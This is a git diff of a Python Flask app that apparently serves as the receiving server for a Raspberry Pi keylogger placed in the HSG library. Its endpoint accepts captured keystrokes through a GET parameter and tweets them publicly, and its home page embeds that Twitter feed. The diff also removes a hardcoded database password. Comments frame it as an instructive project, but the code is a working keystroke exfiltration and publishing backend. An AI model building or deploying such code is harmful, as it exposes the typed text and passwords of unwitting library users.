@@ -1,10 +1,7 @@
-# import dependencies
 import os
 from flask import Flask
-from flask import request #otherwise request. wont be recognized!
-import psycopg2
+from flask import request #otherwise request. wont be recognized, requests via pip doesnt work
 from library import create_tweet
-
 
 # bootstrap the app
 app = Flask(__name__)
@@ -14,49 +11,26 @@ port = int(os.getenv('PORT', '3000'))
 
 # our base route which just returns a string
 @app.route('/')
-def hello_world():
-    return 'Hi, these are the Keylogs from the Raspberry [S]py which is located at the HSG library.'
+def twitter_website():
+    return '''
+    <html><body>
+    <h1>Hi, these are the Keylogs from the Raspberry [S]py which is located at the HSG library.</h1>
+    <p><a class="twitter-timeline" href="https://twitter.com/gigerbytes?ref_src=twsrc%5Etfw">
+    Tweets by gigerbytes</a> 
+    <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script></p>
+    </body></html>
+    '''
+# --> implementing the twitter timeline as html code in python
 
 @app.route("/in_string") #endpoint
-def get_string():   #for GET Data
-    keys_received = request.args.get("key_info")
+def get_string():   #for 'GET' Data ('POST' would be more secure, but isnt as instructive for our purposes)
+    keys_received = request.args.get("key_info") # "key_info" corresponds with the RaspberrySpy keylogger.py 'GET'
     print(keys_received) #to have some feedback in the flask log
-    create_tweet(keys_received)
+    create_tweet("[HSGbib] " + keys_received) #refers to function in the library for tweeting the keys received         
+ 
+    return "OK"    
     
-    # tweet the keys received
-    
-    # store the keys in the database
-
-    return "OK"    #or return keys_received
-
-
 # start the app
 if __name__ == '__main__':
-    print("AAAAAAAA")           #erase later!!!
-    #connect to psycopg2
-    try:
-        connection = psycopg2.connect(user = "postgres",
-                                    password = "keylogger19",
-                                    host = "127.0.0.1",
-                                    port = "5432",
-                                    database = "postgres")
-        cursor = connection.cursor()
-        # Print PostgreSQL Connection properties
-        print ( connection.get_dsn_parameters(),"\n")
-        # Print PostgreSQL version
-        cursor.execute("SELECT version();")
-        record = cursor.fetchone()
-        print("You are connected to - ", record,"\n")
-    except (Exception, psycopg2.Error) as error :
-        print ("Error while connecting to PostgreSQL", error)
-    finally:
-        #closing database connection.
-            if(connection):
-                cursor.close()
-                connection.close()
-                print("PostgreSQL connection is closed")
-
-
 
     app.run(host='0.0.0.0', port=port)
-
